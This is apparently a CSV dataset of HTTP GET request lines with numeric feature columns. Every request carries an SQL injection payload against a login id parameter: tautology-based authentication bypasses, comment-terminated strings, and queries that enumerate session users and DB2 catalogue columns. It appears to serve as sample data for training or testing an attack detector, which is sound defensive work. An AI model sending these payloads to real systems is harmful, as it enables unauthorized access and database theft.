35,1,200,7160,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,4996,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,5368,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,3555,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,3867,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,3462,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,6304,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,4712,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,4988,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,4443,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,2595,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,6828,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
31,1,200,2019,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,3032,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,4270,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,3114,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,4654,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,3524,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,7731,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,7221,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,7962,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,3034,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,1090,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,2809,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,5556,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,2226,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,1696,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,7644,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,7975,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,7260,7,9,5,3,1,GET login/?id=or 1=1/* HTTP/1.1
26,1,200,3964,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,7585,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,1796,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,2100,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,6636,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,2417,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,7655,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,2386,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,6600,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,5683,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,1968,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,5358,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,5858,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,7100,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,1166,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,1419,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,4998,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,4521,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,4476,7,7,4,2,1,GET login/?id="*" HTTP/1.1
26,1,200,4908,7,7,4,2,1,GET login/?id="*" HTTP/1.1
38,1,200,7531,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,2477,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,3671,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,4740,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,1988,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,6913,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,6848,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,1823,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,3640,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,2624,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,6974,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,5586,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,4633,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,5511,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,3829,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,7156,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,7713,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,7775,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,4551,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
38,1,200,7935,7,14,6,2,1,GET login/?id=admin" or 1=1-- HTTP/1.1
43,1,200,4052,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,3475,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,7387,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,2718,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,3332,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,6333,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,2802,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,4600,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,4947,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,3567,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,6105,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,6874,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,4614,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,4921,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,3101,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,7965,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,2797,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,2291,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,4465,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,4382,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,1522,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,4345,7,14,7,2,1,GET login/?id=admin") or ("1"="1"# HTTP/1.1
43,1,200,5121,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,2911,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,4199,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,6118,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,6622,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,3965,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,5671,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,4435,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,3487,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,3469,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,7336,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,2924,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,6817,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,2379,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,4431,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,2303,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,3824,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
43,1,200,1097,7,24,4,2,1,GET login/?id=select session_user; HTTP/1.1
31,1,200,2962,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,3731,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,5608,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,7151,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,1059,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,2608,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,3995,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,4791,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,3164,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,1133,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,2540,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,7156,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,2477,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,4750,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,3365,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,5852,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,7900,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,7361,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,7615,7,13,3,2,1,GET login/?id= or true HTTP/1.1
33,1,200,1650,7,9,5,2,1,GET login/?id=' or 1=1 – HTTP/1.1
33,1,200,6877,7,9,5,2,1,GET login/?id=' or 1=1 – HTTP/1.1
33,1,200,2507,7,9,5,2,1,GET login/?id=' or 1=1 – HTTP/1.1
33,1,200,3524,7,9,5,2,1,GET login/?id=' or 1=1 – HTTP/1.1
33,1,200,2233,7,9,5,2,1,GET login/?id=' or 1=1 – HTTP/1.1
33,1,200,2079,7,9,5,2,1,GET login/?id=' or 1=1 – HTTP/1.1
33,1,200,4982,7,9,5,2,1,GET login/?id=' or 1=1 – HTTP/1.1
33,1,200,1238,7,9,5,2,1,GET login/?id=' or 1=1 – HTTP/1.1
33,1,200,4953,7,9,5,2,1,GET login/?id=' or 1=1 – HTTP/1.1
33,1,200,1523,7,9,5,2,1,GET login/?id=' or 1=1 – HTTP/1.1
33,1,200,3132,7,9,5,2,1,GET login/?id=' or 1=1 – HTTP/1.1
33,1,200,6075,7,9,5,2,1,GET login/?id=' or 1=1 – HTTP/1.1
33,1,200,2536,7,9,5,2,1,GET login/?id=' or 1=1 – HTTP/1.1
33,1,200,5627,7,9,5,2,1,GET login/?id=' or 1=1 – HTTP/1.1
28,1,200,7340,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,5685,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,5031,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,7654,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,6830,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,2348,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,2945,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,2582,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,4108,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,3174,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,1515,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,1179,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,3161,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,2864,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,5235,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,2597,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
28,1,200,1689,7,8,5,1,1,GET ?id=" or true-- HTTP/1.1
36,1,200,4970,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,7092,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,1737,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,2687,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,5719,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,1245,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,2730,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,1791,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,6158,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,3185,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,1676,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,4238,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,6699,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,4152,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,4474,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,7667,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,3786,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,5085,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,1262,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,4927,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
36,1,200,5130,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
38,1,200,5678,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,1288,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,3430,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,6963,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,1780,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,7965,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,3576,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,6183,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,4081,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,2264,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,3805,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,5507,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,4766,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,2002,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,5843,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,1207,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
32,1,200,6314,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,6349,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,1883,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,5248,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,3054,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,4460,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,7107,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,5077,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,7301,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,5082,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,7090,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,2923,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,2027,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,6388,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,6523,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,2920,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,4607,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,5231,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,6615,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,5585,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,5684,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
32,1,200,1032,7,9,4,2,1,GET login/?id=" or ""-" HTTP/1.1
40,1,200,2270,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,7238,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,2062,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,6341,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,2503,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,1583,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,3312,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,6339,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,7385,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,7356,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,5702,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,1882,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,5335,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,6302,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,1359,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,5876,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,5890,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,5457,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,7847,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,5335,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,5744,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,3827,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,3582,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,1121,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,3914,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,6683,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,2437,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
40,1,200,6054,7,16,8,2,1,GET login/?id=' and 'one'='one– HTTP/1.1
38,1,200,1605,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,4638,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,2171,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,7234,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,7686,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,7382,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,1990,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,7459,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,5156,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,7277,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,5883,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,7675,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,7171,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,7711,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,7007,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,6954,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
38,1,200,7311,7,14,5,3,1,GET login/?id=admin" or 1=1/* HTTP/1.1
32,1,200,7330,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,4619,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,3360,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,1020,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,4875,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,1461,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,5539,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,3957,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,6261,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,1368,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,5660,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,1054,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,4346,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,4076,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,7876,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,7176,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,2025,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,3528,7,9,5,3,1,GET login/?id= or 1=1/* HTTP/1.1
34,1,200,5603,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,3721,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,5127,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,6982,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,6030,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,1517,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,4812,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,1427,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,4743,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,1607,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,4637,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,2626,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,2377,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,1167,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,6926,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,6960,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
34,1,200,1930,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
75,1,200,6005,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,6777,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,7495,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,5669,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,2044,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,3261,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,3317,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,6496,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,6119,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,7359,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,2800,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,3854,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,2900,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,6398,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,4928,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,6826,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,1478,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,4075,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
32,1,200,2498,7,9,5,2,1,GET login/?id= or 0=0 # HTTP/1.1
32,1,200,6413,7,9,5,2,1,GET login/?id= or 0=0 # HTTP/1.1
32,1,200,2240,7,9,5,2,1,GET login/?id= or 0=0 # HTTP/1.1
32,1,200,3808,7,9,5,2,1,GET login/?id= or 0=0 # HTTP/1.1
32,1,200,6462,7,9,5,2,1,GET login/?id= or 0=0 # HTTP/1.1
32,1,200,6063,7,9,5,2,1,GET login/?id= or 0=0 # HTTP/1.1
32,1,200,7992,7,9,5,2,1,GET login/?id= or 0=0 # HTTP/1.1
